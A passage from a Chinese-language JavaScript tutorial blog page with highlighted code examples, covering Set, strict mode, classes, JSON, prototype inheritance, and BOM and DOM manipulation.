指向的是不同的对象，所以没问题</span>mySet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>mySet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span>mySet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// true</span>mySet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true</span>mySet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">"Some Text"</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>mySet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>mySet<span class="token punctuation">.</span>size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 5</span>mySet<span class="token punctuation">.</span><span class="token keyword">delete</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true,  从set中移除5</span>mySet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// false, 5已经被移除</span>mySet<span class="token punctuation">.</span>size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 4, 刚刚移除一个值</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>mySet<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// logs Set(4) [ 1, "some text", {…}, {…} ] in Firefox</span><span class="token comment" spellcheck="true">// logs Set(4) { 1, "some text", {…}, {…} } in Chrome</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="严格检查模式"><a href="#严格检查模式" class="headerlink" title="严格检查模式"></a>严格检查模式</h2><p>由于<code>javascript</code>代码极为简单，很容易因为语法不严谨产生问题，所以<code>javascript</code>有了严格检查模式</p><p>即在<code>js</code>代码前加上<code>&#39;use strict&#39;</code></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>严格检查模式是<code>ES6</code>的特性，必要写在第一行</strong></p><h1 id="控制台调试"><a href="#控制台调试" class="headerlink" title="控制台调试"></a>控制台调试</h1><p><strong><code>console.log(变量名)</code>打印一个变量</strong></p><p>调试：</p><p><img src="image-20210829121730146.png" alt="image-20210829121730146"></p><h1 id="class类"><a href="#class类" class="headerlink" title="class类"></a><code>class</code>类</h1><h2 id="JSON对象"><a href="#JSON对象" class="headerlink" title="JSON对象"></a><code>JSON</code>对象</h2><p>目前流行的一种数据传输格式</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">'use strict'</span><span class="token keyword">class</span> <span class="token class-name">ABC</span><span class="token punctuation">{</span>    <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">let</span> me <span class="token operator">=</span> <span class="token punctuation">{</span>            name<span class="token punctuation">:</span> <span class="token string">"Atmujie"</span><span class="token punctuation">,</span>            password<span class="token punctuation">:</span> <span class="token string">"***"</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> me<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> abc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ABC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 将对象转化为JSON格式</span><span class="token keyword">let</span> json <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>abc<span class="token punctuation">.</span><span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// {"name":"Atmujie","password":"***"}</span><span class="token comment" spellcheck="true">// 将JSON字符串转换为对象</span><span class="token keyword">let</span> jsonde <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jsonde<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210901183856998.png" alt="image-20210901183856998"></p><h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token string">'use strict'</span><span class="token keyword">class</span> <span class="token class-name">ABC</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//设置构造器</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>m <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">new</span> <span class="token class-name">ABC</span><span class="token punctuation">(</span><span class="token string">"mujie"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h2><p><code>js</code>存在原型的概念，原型和父类其实并无区别</p><p>所有类/方法/对象最终的原型都是<code>Object</code></p><p>原型的指向可以用两种方式实现：</p><blockquote><p>前端<code>js</code>的方法</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token string">'use strict'</span><span class="token keyword">let</span> A <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">"XiaoMing"</span><span class="token punctuation">,</span>    age<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    getAge<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"现在"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">+</span><span class="token string">"岁了"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> B <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">"LiHua"</span><span class="token punctuation">}</span>B<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> A<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>B<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// LiHua现在10岁了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>ES6</code>后端习惯写法</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    name <span class="token operator">=</span> <span class="token string">"XiaoMing"</span><span class="token punctuation">;</span>    age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"现在"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">+</span><span class="token string">"岁了"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    name <span class="token operator">=</span> <span class="token string">"LiHua"</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// LiHua现在10岁了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原型链继承图解</p><p><img src="image-20210902120249499.png" alt="image-20210902120249499"></p><p>注：<code>Object</code>在不断的循环</p><h1 id="操作BOM与DOM对象"><a href="#操作BOM与DOM对象" class="headerlink" title="操作BOM与DOM对象"></a>操作<code>BOM</code>与<code>DOM</code>对象</h1><h2 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a><code>BOM</code></h2><p><code>BOM</code>即为==浏览器对象模型==</p><p>操作<code>BOM</code>便是操作浏览器</p><p>==以下摘自菜鸟教程==</p><h3 id="Window-对象"><a href="#Window-对象" class="headerlink" title="Window 对象"></a>Window 对象</h3><ul><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_alert">弹出一个警告框</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_alert2">弹出一个带折行的警告框</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_confirm">弹出一个确认框，并提醒访客点击的内容</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_prompt">弹出一个提示框</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_openwindow">点击一个按钮时，打开一个新窗口</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_openallwindow">打开一个新窗口，并控制其外观</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_multiwindows">打开多个新窗口</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_multiwindows">确保新的窗口没有获得焦点</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_win_focus">确保新的窗口获得焦点</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_win_close">关闭新窗口</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_win_closed">检查新的窗口是否已关闭</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_win_name">返回新窗口的名字</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_win_opener">传输一些文本到源（父）窗口</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_win_moveby">相对于当前位置移动新窗口</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_win_moveto">移动新窗口到指定位置</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_print">打印当前页面</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_dom_window_resizeby">用像素指定窗口大小</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_dom_window_resizeto">指定窗口大小</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_dom_window_scrollby">由指定的像素数滚动内容</a></li><li><a href="https://www.runoob.com/try/try.php?filename=try_dom_window_scrollto">滚动到指定内容处</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_timing2">一个简单的时钟</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_timing_stop">用setTimeout() 和 clearTimeout()设置和停止定时器</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_setinterval">用setInterval() 和 clearInterval()设置和停止定时器</a></li></ul><h3 id="Navigator-对象"><a href="#Navigator-对象" class="headerlink" title="Navigator 对象"></a>Navigator 对象</h3><ul><li><a href="https://www.runoob.com/try/try.php?filename=try_nav_all">访问者的浏览器的详细</a></li></ul><h3 id="Screen-对象"><a href="#Screen-对象" class="headerlink" title="Screen 对象"></a>Screen 对象</h3><ul><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_screen_all">访问者的屏幕的详细</a></li></ul><h3 id="History-对象"><a href="#History-对象" class="headerlink" title="History 对象"></a>History 对象</h3><ul><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_his_length">返回一个url的历史清单</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_his_back">创建一个后退按钮</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_his_forward">创建一个前进按钮</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_his_go">从url的历史清单转到指定的url</a></li></ul><h3 id="Location-对象"><a href="#Location-对象" class="headerlink" title="Location 对象"></a>Location 对象</h3><ul><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_loc_host">返回主机名和当前url的端口号</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_loc_href">返回当前页面的整个URL</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_loc_pathname">返回当前url的路径名</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_loc_protocol">返回当前URL的协议部分</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_loc_assign">加载个新文档</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_loc_reload">重新载入当前文档</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjsref_loc_replace">替代当前文档</a></li><li><a href="https://www.runoob.com/try/try.php?filename=tryjs_breakout">跳出框架</a></li></ul><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a><code>DOM</code></h2><p><code>DOM</code>即为<code>document</code>文档，这里指<code>HTML</code>文档</p><p>即<code>DOM</code>是对<code>HTML</code>的操作</p><p><img src="https://www.runoob.com/images/pic_htmltree.gif" alt="DOM HTML tree"></p><p>通过可编程的对象模型，JavaScript 获得了足够的能力来创建动态的 HTML。</p><ul><li>JavaScript 能够改变页面中的所有 HTML 元素</li><li>JavaScript 能够改变页面中的所有 HTML 属性</li><li>JavaScript 能够改变页面中的所有 CSS 样式</li><li>JavaScript 能够对页面中的所有事件做出反应</li></ul><h3 id="查找-HTML-元素"><a href="#查找-HTML-元素" class="headerlink" title="查找 HTML 元素"></a>查找 HTML 元素</h3><p>有三种方法：</p><ul><li>通过 id 找到 HTML 元素</li><li>通过标签名找到 HTML 元素</li><li>通过类名找到 HTML 元素</li></ul><h4 id="通过-id-查找-HTML-元素"><a href="#通过-id-查找-HTML-元素" class="headerlink" title="通过 id 查找 HTML 元素"></a>通过 id 查找 HTML 元素</h4><p>在 DOM 中查找 HTML 元素的最简单的方法，是通过使用元素的 id。</p><p>本例查找 id=”intro” 元素：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"intro"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果找到该元素，则该方法将以对象（在 x 中）的形式返回该元素。</p><p>如果未找到该元素，则 x 将包含 null。</p><h4 id="通过标签名查找-HTML-元素"><a href="#通过标签名查找-HTML-元素" class="headerlink" title="通过标签名查找 HTML 元素"></a>通过标签名查找 HTML 元素</h4><p>本例查找 id=”main” 的元素，然后查找 id=”main” 元素中的所有 <p> 元素：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> y<span class="token operator">=</span>x<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="通过类名找到-HTML-元素"><a href="#通过类名找到-HTML-元素" class="headerlink" title="通过类名找到 HTML 元素"></a>通过类名找到 HTML 元素</h4><p>本例通过 <strong><a href="https://www.runoob.com/jsref/met-document-getelementsbyclassname.html">getElementsByClassName</a></strong> 函数来查找 class=”intro” 的元素：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">"intro"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="修改HTML元素"><a href="#修改HTML元素" class="headerlink" title="修改HTML元素"></a>修改<code>HTML</code>元素</h3><h4 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h4><p>修改<code>html</code>的内容使用<code>innerHTML/innerText</code>方法</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> x <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"新的内容"</span><span class="token punctuation">;</span><span class="token keyword">let</span> y <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"新的内容"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// innerHTML可以解析文本，innerText只能修改为字符</span><span class="token keyword">let</span> m <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;h1>111&lt;/h1>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// h1标签样式的111</span><span class="token keyword">let</span> n <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"&lt;h1>111&lt;/h1>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 字符串&lt;h1>111&lt;/h1></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="修改属性"><a href="#修改属性" class="headerlink" title="修改属性"></a>修改属性</h4><p>修改<code>html</code>标签的属性使用<code>attribute</code></p><p>语法：</p><pre class="line-numbers language-js"><code class="language-js">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span>attribute【属性名】 <span class="token operator">=</span> 新属性<span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>property【样式名】<span class="token operator">=</span>新样式<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>smiley.gif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>p1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hello World!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"image"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"landscape.jpg"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//修改了src属性</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"p1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">"bule"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//修改了color为蓝色</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="删除HTML节点"><a href="#删除HTML节点" class="headerlink" title="删除HTML节点"></a>删除<code>HTML</code>节点</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>h1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>h1.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>999999<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token comment" spellcheck="true">//获取要删除的节点</span>        <span class="token keyword">let</span> h1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"h1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取父节点</span>        <span class="token keyword">let</span> father <span class="token operator">=</span> h1<span class="token punctuation">.</span>parentElement<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过父节点删除子节点</span>        father<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*也可以直接获取父节点删除子节点*/</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210902174044311.png" alt="image-20210902174044311"></p><h3 id="追加元素"><a href="#追加元素" class="headerlink" title="追加元素"></a>追加元素</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>re<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>222<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>222<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token comment" spellcheck="true">//获取父节点</span>  <span class="token keyword">let</span> father <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建新节点</span>  <span class="token keyword">let</span> child <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置新节点id和值</span>  child<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">"333"</span><span class="token punctuation">;</span>  child<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"333"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置属性[此方法同样可以设置id]</span>  child<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"style"</span><span class="token punctuation">,</span><span class="token string">"color: blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 或：child.style.color = "#66CCFF";</span>      <span class="token comment" spellcheck="true">//将新节点插入父节点</span>  father<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token 